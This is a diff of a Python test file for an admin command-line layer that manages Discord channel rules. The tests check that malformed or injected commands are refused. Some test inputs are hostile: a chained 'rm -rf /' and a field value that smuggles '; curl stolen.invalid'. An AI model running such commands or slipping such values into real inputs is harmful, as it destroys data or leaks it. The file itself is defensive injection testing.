@@ -18,7 +18,7 @@ from daimon.core._models import Tenant
 from daimon.core.authz import Action, Place, Subject, authorize
 from daimon.core.channel_backend import current_backend
 from daimon.core.defaults.provisioning import provision_tenant
-from daimon.core.stores import channel_admins, channel_budgets, routines, tenant_ledger, tenants
+from daimon.core.stores import channel_budgets, routines, tenant_ledger, tenants
 from daimon.core.stores.access_policy import load_access_policy
 from daimon.testing.admin_bindings import (
     AdminBindings,
@@ -142,29 +142,6 @@ async def test_writers_none_is_real_admission_policy_and_teardown_restores_it(
         action=Action.START_TURN,
         place=Place(channel_id=min(binding.channels)),
     )
-    assert not binding.trace.requests
-
-
-async def test_real_grant_changes_product_authorization(binding: AdminBindings) -> None:
-    receipt = await invoke(
-        binding,
-        "daimon channels admins set discord {guild_id} {channel_id} --user {env.qa_user_id}",
-    )
-    assert receipt.status == "executed"
-    async with binding.sessions() as session:
-        tenant_id = uuid.UUID(binding.scope.tenant_id)
-        grant = await channel_admins.get_channel_admins(
-            session, tenant_id=tenant_id, platform="discord", channel_id=min(binding.channels)
-        )
-        administered = await channel_admins.list_administered_channel_ids(
-            session,
-            tenant_id=tenant_id,
-            platform="discord",
-            platform_user_id="423456789012345678",
-            role_ids=(),
-        )
-    assert grant is not None and grant.updated_by_account_id == uuid.UUID(binding.scope.account_id)
-    assert administered == {min(binding.channels)}
     assert not binding.trace.requests
 
 
@@ -304,8 +281,8 @@ async def test_frozen_credit_draining_does_not_forge_a_ledger_write(binding: Adm
 @pytest.mark.parametrize(
     "command",
     [
-        "daimon channels admins set discord foreign {channel_id} --user 423456789012345678",
-        "daimon channels admins set discord {guild_id} 923456789012345678 --user 423456789012345678",
+        "daimon channels rule set discord foreign {channel_id} --writers none",
+        "daimon channels rule set discord {guild_id} 923456789012345678 --writers none",
         "daimon tenants turn-cap slack {guild_id} 2",
     ],
 )
@@ -337,9 +314,9 @@ async def test_foreign_account_and_unscoped_context_are_refused(binding: AdminBi
 @pytest.mark.parametrize(
     "command",
     [
-        "daimon channels admins set discord {guild_id} {channel_id} --user {missing}",
-        "daimon channels admins set discord {guild_id} {channel_id} --header SECRET",
-        "daimon channels admins set discord {guild_id} {channel_id} --user u1 --user u2",
+        "daimon channels rule set discord {guild_id} {channel_id} --writers {missing}",
+        "daimon channels rule set discord {guild_id} {channel_id} --header SECRET",
+        "daimon channels rule set discord {guild_id} {channel_id} --writers none --writers any",
         "daimon channels rule set discord {guild_id} {channel_id} --writers any ; rm -rf /",
     ],
 )
@@ -352,16 +329,16 @@ async def test_unknown_syntax_remains_pending_no_shell_or_io(
 
 
 async def test_fixture_value_cannot_inject_additional_shell_tokens(binding: AdminBindings) -> None:
-    with pytest.raises(ValueError):
-        await binding.execute(
-            source(
-                "daimon channels admins set discord {guild_id} {channel_id} --user {env.qa_user_id}"
-            ),
-            {
-                "channel_id": min(binding.channels),
-                "env.qa_user_id": "423456789012345678 --user other; curl stolen.invalid",
-            },
-        )
+    receipt = await binding.execute(
+        source(
+            "daimon channels rule set discord {guild_id} {channel_id} --writers {env.qa_user_id}"
+        ),
+        {
+            "channel_id": min(binding.channels),
+            "env.qa_user_id": "any --writers none; curl stolen.invalid",
+        },
+    )
+    assert receipt.status == "pending" and receipt.code == "ADMIN_RULE_VALUE_UNBOUND"
     assert not binding.trace.requests
 
 
@@ -417,8 +394,10 @@ def test_frozen_admin_source_pin_and_operation_coverage() -> None:
                 parsed.append(parse_admin(invocation["source"], values))
             except UnboundAdmin as error:
                 pending.append((row["scenario_id"], error.code))
-    assert len(parsed) == 36 and pending == [
+    assert len(parsed) == 34 and pending == [
         ("QA-NEW14-MISSING-THREAD-PERMISSION-COPY", "ADMIN_PLATFORM_EDGE_UNBOUND"),
+        ("QA-NEW17-MCP-USABLE-NEXT-MESSAGE", "ADMIN_CLI_OPERATION_UNBOUND"),
+        ("QA-NEW18-SKILL-ADD-YES-PLEASE", "ADMIN_CLI_OPERATION_UNBOUND"),
         ("QA-NEW27-MISTYPED-TOKEN-HEADLESS", "ADMIN_TOOL_UNBOUND"),
     ]
     assert all("{" not in (command.channel_id or "") for command in parsed)
